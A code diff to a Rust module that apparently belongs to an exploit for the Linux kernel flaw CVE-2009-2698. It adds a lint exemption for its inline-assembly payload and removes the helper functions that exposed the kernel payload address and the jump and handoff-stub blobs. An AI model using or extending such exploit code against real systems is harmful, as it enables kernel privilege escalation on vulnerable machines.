@@ -4,6 +4,10 @@
 //! and the jump payload.  The same layout is used by the earlier C
 //! implementation of the CVE-2009-2698 route; see `README.md`.
 
+// `global_asm!` is the assembly payload.  The `unsafe_code` lint flags the
+// macro itself; there is no Rust `unsafe` in this module.
+#![allow(unsafe_code)]
+
 use core::arch::global_asm;
 
 global_asm!(
@@ -141,31 +145,3 @@ stub_blob_start:
 stub_blob_end:
 "#
 );
-
-extern "C" {
-    fn kernel_payload();
-    static jump_blob_start: u8;
-    static jump_blob_end: u8;
-    static stub_blob_start: u8;
-    static stub_blob_end: u8;
-}
-
-/// Address of the kernel-mode payload that `ip_append_data()` calls.
-pub(crate) fn kernel_payload_addr() -> u32 {
-    kernel_payload as *const () as usize as u32
-}
-
-unsafe fn blob(start: *const u8, end: *const u8) -> &'static [u8] {
-    let len = end as usize - start as usize;
-    core::slice::from_raw_parts(start, len)
-}
-
-/// The payload copied to virtual address 0x80 for the second trigger.
-pub(crate) fn jump_blob() -> &'static [u8] {
-    unsafe { blob(&jump_blob_start, &jump_blob_end) }
-}
-
-/// The MMU-off handoff stub copied to physical address 0xc3f80000.
-pub(crate) fn stub_blob() -> &'static [u8] {
-    unsafe { blob(&stub_blob_start, &stub_blob_end) }
-}
